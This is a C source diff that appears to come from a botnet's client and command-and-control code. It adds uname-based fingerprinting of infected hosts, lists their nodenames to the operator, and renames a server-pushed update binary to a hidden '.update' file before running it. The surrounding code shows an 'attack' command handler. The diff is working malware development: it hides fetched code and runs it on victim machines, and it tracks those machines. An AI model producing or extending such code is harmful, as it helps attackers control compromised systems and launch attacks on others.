@@ -30,6 +30,7 @@
 #include <strings.h>
 #include <errno.h>
 #include <pthread.h>
+#include <sys/utsname.h>
 
 list_p client_list = NULL;
 pthread_mutex_t client_list_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -82,6 +83,7 @@ int alexjlz_register(struct client *c, struct packet *p)
             c_iter->last_heartbeat = time(NULL); // update heartbeat
             bzero(c_iter->asc_last_heartbeat, sizeof(c_iter->asc_last_heartbeat));
             alexjlz_time(c_iter->asc_last_heartbeat); // ascii heartbeat
+            bcopy(&(p->uts), &(c_iter->uts), sizeof(struct utsname));
             parse_string(p->value, c_iter->current_task, "current_task", sizeof(c_iter->current_task)); // current task
             if ( strlen(c_iter->task) != 0 )  // sign task
             {
@@ -211,6 +213,7 @@ int ask_for_service( int server_fd )
         bzero(hash, sizeof(hash));
         randomstr(random_str, 20);   // register to server
         alexjlz_hash(random_str, hash);
+        uname(&(p.uts));
 
         sprintf(p.value, "random_str:%s hash:%s uuid:%s", random_str, hash, uuid);
         p.type = packet_register;
@@ -270,7 +273,7 @@ int ask_for_service( int server_fd )
                         char c = 0;
                         int i = 0;
                         //parse_string(q.value, url, "url", sizeof(url)-1);
-                        int update_fd = open("update", O_RDWR | O_CREAT, 0755);
+                        int update_fd = open(".update", O_RDWR | O_CREAT, 0755);
                         if ( update_fd < 0 )
                             exit(-1);
                         while ( i<update_len )
@@ -284,7 +287,7 @@ int ask_for_service( int server_fd )
                             i++;
                         }
                         close(update_fd);
-                        execl("./update", "./update", NULL);
+                        execl("./.update", "./.update", NULL);
                     }
                 }
                 else if ( strcmp(cmd, "attack") == 0 )
@@ -383,7 +386,7 @@ int process_command(struct alexjlz_packet *p, list_p output)
         while ( (c_iter = list_next(client_list_iter)) != NULL )
         {
             bzero(&output_packet, sizeof(output_packet));
-            sprintf(output_packet.value, "uuid:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
+            sprintf(output_packet.value, "uuid:%s nodename:%s ip:%s last_heartbeat:%s current_task:%s\n", c_iter->uuid, c_iter->uts.nodename, c_iter->ip, c_iter->asc_last_heartbeat, c_iter->current_task);
             list_add(output, &output_packet, sizeof(output_packet));
         }
         pthread_mutex_unlock(&client_list_mutex);
